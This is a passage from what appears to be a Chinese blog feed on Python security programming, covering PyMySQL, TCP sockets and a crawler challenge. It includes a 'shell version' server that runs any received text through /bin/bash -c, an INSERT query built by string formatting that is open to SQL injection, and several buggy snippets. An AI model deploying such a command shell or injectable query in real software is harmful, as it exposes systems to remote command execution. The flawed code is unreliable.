srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413220446642"></p><p>Python DB API运行机制</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshpia3j4j31k60msajl.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshpia3j4j31k60msajl.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413220526822"></p><p>Python DB API访问数据库流程</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshqk8u66j31eq0l0grr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdshqk8u66j31eq0l0grr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200413220627693"></p><h2 id="Python-MySQL开发环境"><a href="#Python-MySQL开发环境" class="headerlink" title="Python MySQL开发环境"></a>Python MySQL开发环境</h2><p>Python代码 + MySQL服务器 = MySQL for Python</p><p><a href="https://pypi.org/project/MySQL-python/">MySQL-python模块</a>  Mac/Linux系统下无法安装可以查看这个<a href="https://www.jianshu.com/p/7573c2784ad8">教程</a></p><p>呃。。还是没有装上。MySQLdb不支持Python3，所以我们选择PyMySQL。（使用方法还是类似的）</p><h2 id="PyMySQL"><a href="#PyMySQL" class="headerlink" title="PyMySQL"></a>PyMySQL</h2><h3 id="PyMySQL常用对象与方法"><a href="#PyMySQL常用对象与方法" class="headerlink" title="PyMySQL常用对象与方法"></a>PyMySQL常用对象与方法</h3><p>数据库连接对象connection</p><p>连接对象：建立Python客户端与数据库的网络连接</p><p>创建方法：pymysql.connect(参数)</p><center>pymysql.connect(参数)</center><table><thead><tr><th>参数名</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>host</td><td>字符串</td><td>MySQL服务器地址</td></tr><tr><td>port</td><td>数字</td><td>MySQL服务器端口号（可选，默认为3306）</td></tr><tr><td>user</td><td>字符串</td><td>用户名</td></tr><tr><td>passwd</td><td>字符串</td><td>密码</td></tr><tr><td>db</td><td>字符串</td><td>数据库名（可选，默认访问可以连接的数据库）</td></tr><tr><td>Charset</td><td>字符串</td><td>连接编码</td></tr></tbody></table><center>connection对象支持的方法</center><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>cursor()</td><td>使用该连接创建并返回游标</td></tr><tr><td>commit()</td><td>提交当前事物</td></tr><tr><td>rollback()</td><td>回滚当前事物</td></tr><tr><td>close()</td><td>关闭连接</td></tr></tbody></table><center>cursor对象支持的方法</center><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>execute(op[.args])</td><td>执行一个数据库查询命令(select\insert\delete)</td></tr><tr><td>fetchone()</td><td>取得结果集里的下一行</td></tr><tr><td>fetchmany(size)</td><td>获取结果集里的下几行</td></tr><tr><td>fetchall()</td><td>获取结果集里剩下的所有行</td></tr><tr><td>rowcount()</td><td>最近一次execute返回数据的行数或影响行数</td></tr><tr><td>close()</td><td>关闭</td></tr></tbody></table><h3 id="PyMySQL连接测试"><a href="#PyMySQL连接测试" class="headerlink" title="PyMySQL连接测试"></a>PyMySQL连接测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接 没有密码就不填写了passwd=&#x27;&#x27;</span></span><br><span class="line">db = pymysql.connect(host=<span class="string">&quot;localhost&quot;</span>,port=<span class="number">3306</span>, user=<span class="string">&quot;root&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用 execute()  方法执行 SQL 查询 </span></span><br><span class="line">sql=<span class="string">&quot;select schema_name from information_schema.schemata&quot;</span></span><br><span class="line"></span><br><span class="line">cursor.execute(sql)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用 fetchone() 方法获取单条数据.</span></span><br><span class="line">data = cursor.fetchone()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Databases: %s &quot;</span> % data)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">cursor.close()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Databases : mysql </span><br></pre></td></tr></table></figure><h2 id="Python数据库编程示例"><a href="#Python数据库编程示例" class="headerlink" title="Python数据库编程示例"></a>Python数据库编程示例</h2><h3 id="爬取数据"><a href="#爬取数据" class="headerlink" title="爬取数据"></a>爬取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one_page</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> res.text</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urls</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;https://movie.douban.com/top250?start=&#123;&#125;&amp;filter=&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>,<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">p1 = <span class="string">&#x27;&lt;span class=&quot;title&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span></span><br><span class="line">p2 = <span class="string">&#x27;&#x27;&#x27;导[\u4e00-\u9fa5].*&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movie_name</span>(<span class="params">p</span>):</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls():</span><br><span class="line">        key += re.findall(p1, get_one_page(url))</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&amp;&quot;</span> <span class="keyword">in</span> k:</span><br><span class="line">            key.remove(k)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movie_info</span>(<span class="params">p</span>):</span></span><br><span class="line">    key = []</span><br><span class="line">    info = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls():</span><br><span class="line">        key += re.findall(p, get_one_page(url))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        info += <span class="built_in">str</span>(i[:-<span class="number">7</span>].replace(<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="string">&quot; &quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">movie_name = get_movie_name(p1)</span><br><span class="line">movie_info = get_movie_info(p2)</span><br></pre></td></tr></table></figure><h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdywr55971j313e03mdg6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdywr55971j313e03mdg6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200419111923618"></p><h3 id="放入数据库"><a href="#放入数据库" class="headerlink" title="放入数据库"></a>放入数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开数据库连接</span></span><br><span class="line">db = pymysql.connect(host=<span class="string">&quot;localhost&quot;</span>,port=<span class="number">3306</span>, user=<span class="string">&quot;root&quot;</span>, db=<span class="string">&#x27;test1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mn <span class="keyword">in</span> movie_name:</span><br><span class="line">    sql = <span class="string">&quot;insert into movie (name) VALUES (&#x27;%s&#x27;)&quot;</span> % (mn)</span><br><span class="line">    print(sql)</span><br><span class="line">    <span class="comment"># 使用 execute()  方法执行 SQL 查询 </span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 fetchone() 方法获取单条数据.</span></span><br><span class="line">data = cursor.fetchone()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Databases : %s &quot;</span> % data)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">db.commit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdywqldx5vj314a0oye82.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdywqldx5vj314a0oye82.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200419111848816"></p>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程</title>
      <link href="2020/04/13/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>2020/04/13/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本文讲解Python网络编程。</p><a id="more"></a><h2 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h2><p><strong>C/S（C:client，S:Server）</strong>客户机和服务器结构。Server目的就是等待Client的请求，Client连上Server发送必要的数据，然后等待Server端完成请求的反馈。</p><p><strong>C/S网络编程</strong> 服务器端进行设置，首先创建一个通信端点，让服务器端能够监听请求，之后就进入等待和处理客户机请求的无限循环中。客户机编程相对服务器简单，只要创建一个通信端点，建立到服务器的连接，就可以提出请求了。</p><h2 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h2><p>一种具有之前所说的”通信端点“概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字。</p><p>Python支持的Socket：AF_UNIX\AF_NETLINK\AF_INET（基于网络的套接字）</p><h2 id="Socket模块"><a href="#Socket模块" class="headerlink" title="Socket模块"></a>Socket模块</h2><p>socket模块的socket()函数用来创建套接字:<code>socket(socket_family, socket_type, protocol=0)</code></p><p>创建TCP/IP套接字：<code>tcpsock=socket(socket.AF_INET, socket.SOCK_STREAM)</code></p><center>服务器端套接字函数</center><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>s.bind()</td><td>绑定地址（主机，端口）到套接字</td></tr><tr><td>s.listen()</td><td>开始TCP监听</td></tr><tr><td>s.accept()</td><td>被动接受TCP客户端连接，等待连接的到来</td></tr></tbody></table><center>客户端套接字</center><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>s.connect()</td><td>主动初始化TCP服务器连接</td></tr><tr><td>s.connect_ex()</td><td>Connect函数的扩展版本，出错时返回错误代码，而不是抛出异常</td></tr></tbody></table><center>公共用途套接字</center><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>s.recv()</td><td>接受TCP数据</td></tr><tr><td>s.send()</td><td>发送TCP数据</td></tr><tr><td>s.sendall()</td><td>完整发送TCP数据</td></tr><tr><td>s.recvfrom()</td><td>接受UDP数据</td></tr><tr><td>s.sendto()</td><td>发送UDP数据</td></tr><tr><td>s.getpeemame()</td><td>连接到当前套接字的远端地址</td></tr><tr><td>s.getsockname()</td><td>当前套接字的地址</td></tr><tr><td>s.getsockopt()</td><td>返回指定套接字的参数</td></tr><tr><td>s.setsockopt()</td><td>设置指定套接字的参数</td></tr><tr><td>s.close()</td><td>关闭套接字（创建使用后记得关闭）</td></tr></tbody></table><h2 id="网络编程示例"><a href="#网络编程示例" class="headerlink" title="网络编程示例"></a>网络编程示例</h2><h3 id="创建一个TCP服务器的流程"><a href="#创建一个TCP服务器的流程" class="headerlink" title="创建一个TCP服务器的流程"></a>创建一个TCP服务器的流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ss = socket.socket() <span class="comment">#创建服务器套接字</span></span><br><span class="line">ss.bind(host,port) <span class="comment"># 把地址绑定到套接字上</span></span><br><span class="line">ss.listen() <span class="comment">#设置监听连接</span></span><br><span class="line">inf_loop: <span class="comment"># 服务器无线循环</span></span><br><span class="line">    cs = ss.accept() <span class="comment"># 接收客户端连接</span></span><br><span class="line">common_loop: <span class="comment"># 通信循环</span></span><br><span class="line">    cs.recv()/cs.send() <span class="comment"># 对话（接收与发送）</span></span><br><span class="line">cs.close() <span class="comment"># 关闭客户端套接字</span></span><br></pre></td></tr></table></figure><h3 id="创建一个TCP客户端的流程"><a href="#创建一个TCP客户端的流程" class="headerlink" title="创建一个TCP客户端的流程"></a>创建一个TCP客户端的流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cs.socket() <span class="comment"># 创建客户端套接字</span></span><br><span class="line">cs.connect() <span class="comment"># 尝试连接套接字</span></span><br><span class="line">common_loop: <span class="comment"># 通信循环</span></span><br><span class="line">    cs.recv()/cs.send() <span class="comment">#对话（接收与发送）</span></span><br><span class="line">cs.close() <span class="comment"># 关键客户端套接字</span></span><br></pre></td></tr></table></figure><h3 id="编写服务器端脚本"><a href="#编写服务器端脚本" class="headerlink" title="编写服务器端脚本"></a>编写服务器端脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.py</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">23342</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcpServer = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpServer.bind(ADDR)</span><br><span class="line">tcpServer.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;等待连接...&#x27;</span>)</span><br><span class="line">    tcpClient, addr = tcpServer.accept()</span><br><span class="line">    print(<span class="string">&#x27;连接来自：&#x27;</span>+ addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = tcpServer.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tcpClient.send(<span class="string">&#x27;[%s]%s&#x27;</span> % (time.ctime(), data))</span><br><span class="line"></span><br><span class="line">tcpClient.close()</span><br><span class="line">tcpServer.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">等待连接...</span><br><span class="line">连接来自：(&#39;127.0.0.1&#39;, 54879)</span><br></pre></td></tr></table></figure><h3 id="编写客户端脚本"><a href="#编写客户端脚本" class="headerlink" title="编写客户端脚本"></a>编写客户端脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># client.py</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">23342</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcpClient = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpClient.connect(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;~:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tcpClient.send(data)</span><br><span class="line">    data = tcpClient.recv(BUFSIZE)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">tcpClient.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~:test</span><br><span class="line">[Mon Apr 13 20:40:30 2020] test</span><br><span class="line">~:nihao</span><br><span class="line">[Mon Apr 13 20:40:40 2020] nihao </span><br></pre></td></tr></table></figure><h3 id="编写服务器端脚本（shell版本）"><a href="#编写服务器端脚本（shell版本）" class="headerlink" title="编写服务器端脚本（shell版本）"></a>编写服务器端脚本（shell版本）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.py</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">23342</span></span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcpServer = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpServer.bind(ADDR)</span><br><span class="line">tcpServer.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;等待连接...&#x27;</span>)</span><br><span class="line">    tcpClient, addr = tcpServer.accept()</span><br><span class="line">    print(<span class="string">&#x27;连接来自：&#x27;</span>+ addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = tcpServer.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = Popen([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, data], stdin=PIPE, stdout=PIPE)</span><br><span class="line">        data = cmd.stdout.read()</span><br><span class="line">        tcpClient.send(<span class="string">&#x27;[%s]%s&#x27;</span> % (time.ctime(), data))</span><br><span class="line"></span><br><span class="line">tcpClient.close()</span><br><span class="line">tcpServer.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">等待连接...</span><br><span class="line">连接来自：(&#39;127.0.0.1&#39;, 54891)</span><br></pre></td></tr></table></figure><p>重新执行<code>client.py</code>（在<code>server.py</code>执行后）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~:python3 --version</span><br><span class="line">[Mon Apr 13 21:52:41 2020]</span><br><span class="line">Python 3.8.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python多线程编程</title>
      <link href="2020/04/12/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/"/>
      <url>2020/04/12/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本文讲解Python多线程编程。</p><a id="more"></a><h2 id="趣味小游戏"><a href="#趣味小游戏" class="headerlink" title="趣味小游戏"></a>趣味小游戏</h2><p>点击进入<a href="http://www.heibanke.com/lesson/crawler_ex00/">爬虫闯关1</a></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdrctv2duzj31eu0iun11.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdrctv2duzj31eu0iun11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412223104465"></p><p>你需要在每一个页面获取数字，然后将其添加到URL后，依次循环，直到最终的成功页面。当然我们就利用爬虫来完成啦！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.heibanke.com/lesson/crawler_ex00/&#x27;</span></span><br><span class="line">res = requests.get(url)</span><br><span class="line">print(res.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#当HTTP状态码为200时，表示页面返回正常</span></span><br><span class="line"><span class="keyword">while</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">    num = re.findall(<span class="string">r&#x27;\d&#123;5&#125;&#x27;</span>,res.text)</span><br><span class="line">    <span class="comment">#分析页面得知数字在正则匹配后的第二个，将其取出并置于网址后面</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.heibanke.com/lesson/crawler_ex00/&#x27;</span> + num[<span class="number">1</span>]</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line"></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span 